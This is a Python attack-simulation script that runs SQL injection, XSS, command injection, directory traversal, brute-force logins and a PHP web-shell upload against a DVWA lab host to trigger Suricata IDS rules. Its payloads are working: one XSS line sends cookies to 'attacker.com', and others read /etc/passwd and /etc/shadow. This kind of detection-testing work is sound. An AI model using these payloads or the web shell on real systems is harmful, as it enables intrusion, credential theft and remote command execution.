#!/usr/bin/env python3
"""
Web Application Attack Tester
Performs various attacks against DVWA to trigger Suricata alerts
"""

import requests
import time
import sys
from urllib.parse import quote

class WebAttackTester:
    def __init__(self, target_ip="10.77.10.10", port=80):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}" if port != 80 else f"http://{target_ip}"
        self.session = requests.Session()
        
    def log_attack(self, attack_type, payload):
        print(f"[+] Executing {attack_type}: {payload}")
        
    def sql_injection_attacks(self):
        """Test SQL Injection attacks"""
        print("\n=== SQL Injection Attacks ===")
        
        sql_payloads = [
            # UNION-based injection (Rule 1000010)
            "1' UNION SELECT user(),database(),version()--",
            "1' UNION SELECT 1,2,3--",
            
            # OR 1=1 injection (Rule 1000011)
            "admin' OR 1=1--",
            "user' OR 1=1 LIMIT 1--",
            
            # Single quote injection (Rule 1000012)
            "admin'''''''",
            "test' AND '1'='1' AND '2'='2' AND '3'='3'--"
        ]
        
        for payload in sql_payloads:
            try:
                self.log_attack("SQL Injection", payload)
                
                # Test via GET parameter
                response = self.session.get(
                    f"{self.base_url}/vulnerabilities/sqli/",
                    params={"id": payload, "Submit": "Submit"}
                )
                
                # Test via POST data
                response = self.session.post(
                    f"{self.base_url}/login.php",
                    data={"username": payload, "password": "test", "Login": "Login"}
                )
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] SQL Injection failed: {e}")
    
    def xss_attacks(self):
        """Test XSS attacks"""
        print("\n=== XSS Attacks ===")
        
        xss_payloads = [
            # Script tag XSS (Rule 1000020)
            "<script>alert('XSS')</script>",
            "<script>document.location='http://attacker.com/cookie='+document.cookie</script>",
            
            # JavaScript event XSS (Rule 1000021)  
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # IMG tag XSS (Rule 1000022)
            "<img src='javascript:alert(\"XSS\")'>",
            "<img src=x onerror=prompt('XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                self.log_attack("XSS", payload)
                
                # Reflected XSS
                response = self.session.get(
                    f"{self.base_url}/vulnerabilities/xss_r/",
                    params={"name": payload}
                )
                
                # Stored XSS
                response = self.session.post(
                    f"{self.base_url}/vulnerabilities/xss_s/",
                    data={"txtName": payload, "mtxMessage": "Test message", "btnSign": "Sign Guestbook"}
                )
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] XSS attack failed: {e}")
    
    def command_injection_attacks(self):
        """Test Command Injection attacks"""
        print("\n=== Command Injection Attacks ===")
        
        cmd_payloads = [
            # Linux commands (Rule 1000030)
            "127.0.0.1; cat /etc/passwd",
            "localhost; cat /etc/shadow",
            
            # Pipe commands (Rule 1000031)
            "127.0.0.1 | whoami",
            "localhost | id",
            
            # System files (Rule 1000032)
            "127.0.0.1 && cat /etc/passwd",
            "localhost; ls /etc/passwd"
        ]
        
        for payload in cmd_payloads:
            try:
                self.log_attack("Command Injection", payload)
                
                response = self.session.post(
                    f"{self.base_url}/vulnerabilities/exec/",
                    data={"ip": payload, "Submit": "Submit"}
                )
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] Command injection failed: {e}")
    
    def directory_traversal_attacks(self):
        """Test Directory Traversal attacks"""
        print("\n=== Directory Traversal Attacks ===")
        
        traversal_payloads = [
            # Basic traversal (Rule 1000040)
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../../etc/hosts",
            
            # Specific etc/passwd (Rule 1000041)
            "../../etc/passwd",
            "../../../../../../../etc/passwd"
        ]
        
        for payload in traversal_payloads:
            try:
                self.log_attack("Directory Traversal", payload)
                
                response = self.session.get(
                    f"{self.base_url}/vulnerabilities/fi/",
                    params={"page": payload}
                )
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] Directory traversal failed: {e}")
    
    def file_upload_attacks(self):
        """Test File Upload attacks"""
        print("\n=== File Upload Attacks ===")
        
        try:
            # PHP file upload (Rule 1000050)
            self.log_attack("Malicious File Upload", "shell.php")
            
            # Create malicious PHP content (Rule 1000051)
            php_shell_content = "<?php system($_GET['cmd']); ?>"
            
            files = {
                'uploaded': ('shell.php', php_shell_content, 'application/x-php')
            }
            data = {'Upload': 'Upload'}
            
            response = self.session.post(
                f"{self.base_url}/vulnerabilities/upload/",
                files=files,
                data=data
            )
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[-] File upload attack failed: {e}")
    
    def brute_force_attacks(self):
        """Test Brute Force attacks"""
        print("\n=== Brute Force Attacks ===")
        
        common_passwords = [
            "admin", "password", "123456", "admin123", "root",
            "password123", "admin1", "test", "guest", "user"
        ]
        
        for password in common_passwords:
            try:
                self.log_attack("Brute Force", f"admin/{password}")
                
                response = self.session.post(
                    f"{self.base_url}/login.php",
                    data={
                        "username": "admin",
                        "password": password,
                        "Login": "Login"
                    }
                )
                
                time.sleep(0.1)  # Fast brute force to trigger threshold
                
            except Exception as e:
                print(f"[-] Brute force attempt failed: {e}")
    
    def nmap_scan_simulation(self):
        """Simulate Nmap scan behavior"""
        print("\n=== Nmap Scan Simulation ===")
        
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        
        for port in ports:
            try:
                self.log_attack("Port Scan", f"Port {port}")
                
                # Quick connection attempt to simulate SYN scan
                response = self.session.get(
                    f"http://{self.target_ip}:{port}",
                    timeout=1
                )
                
            except Exception as e:
                # Expected to fail for most ports
                pass
            
            time.sleep(0.1)
    
    def run_all_attacks(self):
        """Execute all attack categories"""
        print(f"[*] Starting attack simulation against {self.base_url}")
        print(f"[*] Target: {self.target_ip}")
        print("="*50)
        
        try:
            self.sql_injection_attacks()
            self.xss_attacks()
            self.command_injection_attacks()
            self.directory_traversal_attacks()
            self.file_upload_attacks()
            self.brute_force_attacks()
            self.nmap_scan_simulation()
            
            print("\n" + "="*50)
            print("[*] All attacks completed!")
            print("[*] Check Suricata logs for alerts:")
            print("    - docker exec -it sensor tail -f /var/log/suricata/fast.log")
            
        except KeyboardInterrupt:
            print("\n[!] Attack simulation interrupted by user")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

def main():
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    else:
        target_ip = "10.77.10.10" 
    
    print("Web Application Attack Tester")
    print("=============================")
    print("This script performs various attacks to test Suricata detection")
    print(f"Target: {target_ip}")
    print()
    
    tester = WebAttackTester(target_ip)
    tester.run_all_attacks()

if __name__ == "__main__":
    main()